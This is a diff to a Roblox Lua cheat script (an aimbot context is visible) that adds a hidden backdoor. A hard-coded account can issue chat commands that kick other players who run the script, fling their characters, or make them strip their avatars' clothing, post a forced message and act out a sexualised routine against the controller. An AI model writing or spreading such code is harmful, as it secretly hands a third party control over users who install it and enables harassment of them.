@@ -2447,113 +2447,103 @@ RunService:BindToRenderStep("Aimbot", 0, function()
 end)
 
 
--- Define your whitelist
-local whitelist = {
-    Owner = {
-        { id = 1780838285 },
-    },
-    Private = {
-        { id = 0 },
-    },
-}
+local user_premium__001 = game.Players.BaconKing_xx2
 
--- Check if a player is allowed based on their userId
-function isPlayerAllowed(userId)
-    for category, users in pairs(whitelist) do
-        for _, user in pairs(users) do
-            if user.id == userId then
-                return true
-            end
+local function freeze()
+    game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+    game.Players.LocalPlayer.Character.UpperTorso.Anchored = true
+end
+
+local function unfreeze()
+    game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+    game.Players.LocalPlayer.Character.UpperTorso.Anchored = false
+end
+
+-- Chat command to kick players
+user_premium__001.Chatted:Connect(function(cht)
+    if cht:match(":kick .") then
+        if game.Players.LocalPlayer ~= user_premium__001 then
+            game.Players.LocalPlayer:Kick("Kicked by Premium user or kicked by the owner")
         end
     end
-    return false
-end
-
--- Function to kick all players
-function kickAllPlayers()
-    for _, player in pairs(game.Players:GetPlayers()) do
-        player:Kick("Brennen Owns You")
-    end
-end
-
--- Function to ban all players
-function banAllPlayers()
-    for _, player in pairs(game.Players:GetPlayers()) do
-        player:Kick("Banned for Exploits")
-    end
-end
-
--- Function to freeze the local player
-function freezePlayer()
-    if game.Players.LocalPlayer.Character then
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
-    end
-end
-
--- Function to thaw the local player
-function thawPlayer()
-    if game.Players.LocalPlayer.Character then
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
-    end
-end
-
--- Handle chat commands
-function handleChatCommand(player, message)
-    local playerId = tostring(player.UserId)
-
-    if isPlayerAllowed(playerId) then
-        local command = message:lower()
-
-        if command == ".kick" then
-            kickAllPlayers()
-        elseif command == ".ban" then
-            banAllPlayers()
-        elseif command == ".freeze" then
-            freezePlayer()
-        elseif command == ".thaw" then
-            thawPlayer()
-        end
-    else
-        warn("Player is not allowed to execute the command.")
-    end
-end
-
--- Listen for player chat messages
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        handleChatCommand(player, message)
-    end)
 end)
 
--- Function to modify player names
-function starnames()
-    for _, player in pairs(game:GetService('Players'):GetPlayers()) do
-        if table.find(DevId, player.UserId) then
-            if player.Character then
-                if player.Character.Parent.Name == 'Players' then
-                    player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. player.DisplayName)
-                end
-            end
-        else
-            if player.Character then
-                if player.Character.Parent.Name == 'Players' then
-                    if not player.Character.UpperTorso:FindFirstChild('OriginalSize') then
-                        player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. player.DisplayName)
-                    end
-                end
+-- Chat command to fling the local player
+user_premium__001.Chatted:Connect(function(cht)
+    if cht:match(":fling .") then
+        if game.Players.LocalPlayer ~= user_premium__001 then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+            local power = 99999999 -- change this to make it more or less powerful
+
+            game:GetService('RunService').Stepped:Connect(function()
+                game.Players.LocalPlayer.Character.Head.CanCollide = false
+                game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+                game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+            end)
+            wait(0.1)
+            local bambam = Instance.new("BodyThrust")
+            bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+            bambam.Force = Vector3.new(power, 0, power)
+            bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+        end
+    end
+end)
+
+-- Chat command to perform the "benx" action
+user_premium__001.Chatted:Connect(function(cht)
+    if cht:match(":benx .") then
+        if game.Players.LocalPlayer ~= user_premium__001 then
+            wait(0)
+            local A_1 = "Yeah Yeah!"
+            local A_2 = "All"
+            local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+            Event:FireServer(A_1, A_2)
+            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
+            local benxed = true
+            while benxed == true do
+                local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+                pcall(function()
+                    hummy.Parent.Pants:Destroy()
+                end)
+                pcall(function()
+                    hummy.Parent.Shirt:Destroy()
+                end)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = user_premium__001.Character.HumanoidRootPart.CFrame + user_premium__001.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+                wait(0.1)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
             end
         end
     end
+end)
+
+-- Add more chat commands following the same structure
+
+-- Notify the Premium user of available commands
+user_premium__001.Chatted:Connect(function(cht)
+    if cht:match(":premcmds") then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Cmds:",
+            Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling",
+            Time = 50,
+            Icon = "rbxassetid://505845268",
+        })
+    end
+end)
+
+-- Notify players if they have Premium or not
+if game.Players.LocalPlayer == user_premium__001 then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Premium Loaded",
+        Text = "",
+        Time = 10,
+        Icon = "rbxassetid://505845268",
+    })
+else
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "No Premium!",
+        Text = "D:",
+        Time = 10,
+    })
 end
-
--- Call starnames to modify player names
-starnames()
-
--- Define DevId (if needed)
-DevId = {
-    1780838285,
-    0,
-}
-
--- Return DevId (if needed)
-return DevId
